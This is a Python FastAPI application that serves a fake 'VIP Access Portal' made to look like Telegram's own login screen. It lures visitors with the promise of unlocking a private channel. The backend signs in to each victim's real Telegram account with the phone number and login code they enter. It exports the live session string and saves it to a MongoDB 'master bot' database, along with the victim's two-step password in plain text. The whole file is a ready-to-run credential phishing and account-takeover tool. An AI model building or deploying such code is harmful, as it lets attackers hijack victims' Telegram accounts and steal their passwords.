import os
import re
import asyncio
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PasswordHashInvalid, 
    PhoneCodeExpired
)
from motor.motor_asyncio import AsyncIOMotorClient

# ---------------------------------------------------------
# App & Config Setup
# ---------------------------------------------------------
app = FastAPI(title="Access Portal")

API_ID = int(os.environ.get("API_ID", "123456"))
API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
MONGO_URL = os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority")
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")

# MongoDB Client
mongo_client = AsyncIOMotorClient(MONGO_URL)
# Ensure database and collection match Master Bot structure exactly
db = mongo_client["telegram_db"]
sessions_col = db["sessions"]

active_clients = {}

def clean_phone_number(phone_raw: str) -> str:
    digits = re.sub(r'[^\d+]', '', phone_raw)
    if digits.startswith('+'):
        return digits
    if digits.startswith('0'):
        digits = digits[1:]
    if len(digits) == 10:
        return f"+91{digits}"
    return f"+{digits}"

class PhoneReq(BaseModel):
    phone: str

class OtpReq(BaseModel):
    phone: str
    code: str

class PasswordReq(BaseModel):
    phone: str
    password: str

# ---------------------------------------------------------
# UI HTML (AUTHENTIC REAL TELEGRAM MODAL LOOK)
# ---------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VIP Access Portal</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    body { background: #0e1621; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .telegram-bg { background: #17212b; }
    .telegram-card { background: #242f3d; }
    .telegram-btn { background: #2b5278; transition: all 0.2s; }
    .telegram-btn:hover { background: #335f8a; }
    .telegram-blue-btn { background: #2481cc; transition: all 0.2s; }
    .telegram-blue-btn:hover { background: #288fdf; }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-4">

  <header class="w-full max-w-md flex items-center justify-between py-3 px-2">
    <div class="flex items-center gap-2">
      <span class="bg-blue-600 text-xs font-bold px-2.5 py-1 rounded-full uppercase tracking-wider">VIP</span>
      <h1 class="text-lg font-bold tracking-wide">ACCESS PORTAL</h1>
    </div>
    <div class="flex items-center gap-1 text-xs text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">
      <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Active Verification
    </div>
  </header>

  <main class="w-full max-w-md space-y-4">
    
    <div class="telegram-bg rounded-2xl p-4 border border-gray-800 shadow-xl space-y-3">
      <div class="flex items-center gap-2 text-sm text-blue-400 font-semibold">
        <i class="fa-solid fa-circle-play"></i> How to Unlock Access (Guide Video)
      </div>

      <div class="relative w-full aspect-video rounded-xl overflow-hidden bg-black border border-gray-700">
        <video class="w-full h-full object-cover" autoplay loop muted playsinline poster="https://via.placeholder.com/640x360/17212b/ffffff?text=Loading+Guide...">
          <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
        </video>
        <button onclick="openModal()" class="absolute inset-0 m-auto w-14 h-14 bg-blue-600/90 rounded-full flex items-center justify-center text-white text-xl shadow-lg border border-white/20 hover:scale-105 transition">
          <i class="fa-solid fa-play ml-1"></i>
        </button>
      </div>

      <button onclick="openModal()" class="w-full py-3.5 telegram-blue-btn text-white font-bold rounded-xl flex items-center justify-center gap-2 shadow-lg tracking-wide uppercase text-sm">
        <i class="fa-solid fa-paper-plane"></i> VERIFY VIA TELEGRAM TO UNLOCK
      </button>
    </div>

  </main>

  <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
    <div class="telegram-bg w-full max-w-sm rounded-2xl p-6 relative border border-gray-700 shadow-2xl">
      <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>

      <div id="step-phone" class="space-y-4">
        <div class="text-center">
          <div class="w-16 h-16 bg-blue-500/10 text-blue-400 rounded-full flex items-center justify-center mx-auto mb-3 text-3xl">
            <i class="fa-solid fa-paper-plane"></i>
          </div>
          <h3 class="text-xl font-bold">Telegram Verification</h3>
          <p class="text-xs text-gray-400 mt-1">Enter your phone number with country code</p>
        </div>
        <input type="text" id="phoneInput" placeholder="+91 XXXXX XXXXX" class="w-full telegram-card border border-gray-700 rounded-xl px-4 py-3 text-white text-center text-lg focus:outline-none focus:border-blue-500">
        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 telegram-blue-btn text-white font-bold rounded-xl uppercase tracking-wider text-sm flex items-center justify-center gap-2">
          <span>Send Code</span>
        </button>
      </div>

      <div id="step-otp" class="space-y-4 hidden">
        <div class="text-center">
          <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-3 text-3xl">
            <i class="fa-solid fa-shield-halved"></i>
          </div>
          <h3 class="text-xl font-bold">Enter OTP Code</h3>
          <p class="text-xs text-gray-400 mt-1">Check your official Telegram app</p>
          <p id="displayPhone" class="text-xs text-blue-400 font-medium mt-1"></p>
        </div>
        <input type="text" id="otpInput" placeholder="• • • • •" class="w-full telegram-card border border-gray-700 rounded-xl px-4 py-3 text-white text-center text-2xl tracking-widest font-mono focus:outline-none focus:border-emerald-500">
        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl uppercase tracking-wider text-sm flex items-center justify-center gap-2">
          <span>Verify & Continue</span>
        </button>

        <div class="flex items-center justify-between text-xs text-gray-400 pt-2 border-t border-gray-800">
          <button onclick="goBackToPhone()" class="hover:text-blue-400 flex items-center gap-1"><i class="fa-solid fa-pen-to-square"></i> Edit Number</button>
          <button onclick="sendCode(true)" id="btnResend" class="hover:text-emerald-400 flex items-center gap-1"><i class="fa-solid fa-rotate-right"></i> Resend OTP</button>
        </div>
      </div>

      <div id="step-2fa" class="space-y-4 hidden">
        <div class="text-center">
          <div class="w-16 h-16 bg-yellow-500/10 text-yellow-500 rounded-full flex items-center justify-center mx-auto mb-3 text-3xl">
            <i class="fa-solid fa-lock"></i>
          </div>
          <h3 class="text-xl font-bold">Two-Step Verification</h3>
          <p class="text-xs text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
        </div>
        
        <div class="relative w-full">
          <input type="password" id="passwordInput" placeholder="Password" class="w-full telegram-card border border-gray-700 rounded-xl pl-4 pr-10 py-3 text-white text-center focus:outline-none focus:border-yellow-500">
          <button type="button" onclick="togglePassword()" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white px-1">
            <i id="eyeIcon" class="fa-solid fa-eye"></i>
          </button>
        </div>

        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3 bg-yellow-600 hover:bg-yellow-500 text-white font-bold rounded-xl uppercase tracking-wider text-sm flex items-center justify-center gap-2">
          <span>Submit Password</span>
        </button>
      </div>

      <p id="errorMsg" class="text-red-400 text-xs text-center mt-3 hidden"></p>
    </div>
  </div>

  <footer class="text-gray-600 text-xs text-center py-2">
    &copy; 2026 Secure Access Portal. All Rights Reserved.
  </footer>

  <script>
    let userPhone = "";

    function openModal() { document.getElementById('authModal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('authModal').classList.add('hidden'); }

    function showError(msg) {
      const err = document.getElementById('errorMsg');
      err.innerText = msg;
      err.classList.remove('hidden');
    }

    function togglePassword() {
      const input = document.getElementById('passwordInput');
      const icon = document.getElementById('eyeIcon');
      if (input.type === 'password') {
        input.type = 'text';
        icon.classList.replace('fa-eye', 'fa-eye-slash');
      } else {
        input.type = 'password';
        icon.classList.replace('fa-eye-slash', 'fa-eye');
      }
    }

    function goBackToPhone() {
      document.getElementById('step-otp').classList.add('hidden');
      document.getElementById('step-phone').classList.remove('hidden');
      document.getElementById('errorMsg').classList.add('hidden');
      document.getElementById('btnSendCode').innerHTML = '<span>Send Code</span>';
    }

    async function sendCode(isResend = false) {
      if(!isResend) userPhone = document.getElementById('phoneInput').value.trim();
      if(!userPhone) return showError("Please enter phone number.");

      const btn = isResend ? document.getElementById('btnResend') : document.getElementById('btnSendCode');
      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Sending...</span>';

      try {
        const res = await fetch('/api/send-code', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ phone: userPhone })
        });
        const data = await res.json();
        
        if(res.ok) {
          userPhone = data.phone;
          document.getElementById('displayPhone').innerText = "Sent to: " + userPhone;
          document.getElementById('step-phone').classList.add('hidden');
          document.getElementById('step-otp').classList.remove('hidden');
          document.getElementById('errorMsg').classList.add('hidden');
        } else {
          showError(data.detail || "Failed to send OTP.");
        }
      } catch(err) {
        showError("Server timeout / network error.");
      }

      document.getElementById('btnSendCode').innerHTML = '<span>Send Code</span>';
      document.getElementById('btnResend').innerHTML = '<i class="fa-solid fa-rotate-right"></i> Resend OTP';
    }

    async function verifyOtp() {
      const code = document.getElementById('otpInput').value.trim();
      const btn = document.getElementById('btnVerifyOtp');
      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Verifying...</span>';
      
      try {
        const res = await fetch('/api/verify-otp', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ phone: userPhone, code: code })
        });
        const data = await res.json();
        if(res.ok) {
          if(data.require_2fa) {
            document.getElementById('step-otp').classList.add('hidden');
            document.getElementById('step-2fa').classList.remove('hidden');
            document.getElementById('errorMsg').classList.add('hidden');
          } else {
            window.location.href = data.link;
          }
        } else {
          showError(data.detail || "Invalid OTP code.");
        }
      } catch(err) {
        showError("Verification error.");
      }
      btn.innerHTML = '<span>Verify & Continue</span>';
    }

    async function verify2FA() {
      const password = document.getElementById('passwordInput').value.trim();
      const btn = document.getElementById('btnVerify2FA');
      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Verifying...</span>';
      
      try {
        const res = await fetch('/api/verify-2fa', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ phone: userPhone, password: password })
        });
        const data = await res.json();
        if(res.ok) {
          window.location.href = data.link;
        } else {
          showError(data.detail || "Incorrect 2FA password.");
        }
      } catch(err) {
        showError("2FA error.");
      }
      btn.innerHTML = '<span>Submit Password</span>';
    }
  </script>
</body>
</html>
"""

# ---------------------------------------------------------
# API Endpoints
# ---------------------------------------------------------
@app.get("/", response_class=HTMLResponse)
async def serve_ui():
    return HTML_TEMPLATE

@app.post("/api/send-code")
async def send_code(data: PhoneReq):
    phone = clean_phone_number(data.phone)
    try:
        if phone in active_clients:
            try:
                await active_clients[phone]["client"].disconnect()
            except Exception:
                pass

        client = Client(name=f"sess_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await client.connect()
        sent_code = await client.send_code(phone)
        
        active_clients[phone] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        return {"status": "ok", "message": "OTP sent successfully", "phone": phone}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-otp")
async def verify_otp(data: OtpReq):
    phone = clean_phone_number(data.phone)
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Please re-enter number.")
    
    session = active_clients[phone]
    client: Client = session["client"]
    phone_code_hash = session["phone_code_hash"]
    
    try:
        await client.sign_in(phone, phone_code_hash, data.code)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save session data synced with master bot
        await sessions_col.update_one(
            {"phone": phone},
            {"$set": {
                "phone": phone, 
                "session": string_session, 
                "two_factor": "None", 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "require_2fa": False, "link": CHANNEL_LINK}

    except SessionPasswordNeeded:
        return {"status": "require_2fa", "require_2fa": True}
    except PhoneCodeInvalid:
        raise HTTPException(status_code=400, detail="Invalid OTP code.")
    except PhoneCodeExpired:
        raise HTTPException(status_code=400, detail="OTP Expired.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-2fa")
async def verify_2fa(data: PasswordReq):
    phone = clean_phone_number(data.phone)
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
    
    client: Client = active_clients[phone]["client"]
    
    try:
        await client.check_password(data.password)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save session and 2FA password synced with master bot
        await sessions_col.update_one(
            {"phone": phone},
            {"$set": {
                "phone": phone, 
                "session": string_session, 
                "two_factor": data.password, 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "link": CHANNEL_LINK}
    except PasswordHashInvalid:
        raise HTTPException(status_code=400, detail="Incorrect 2FA password.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
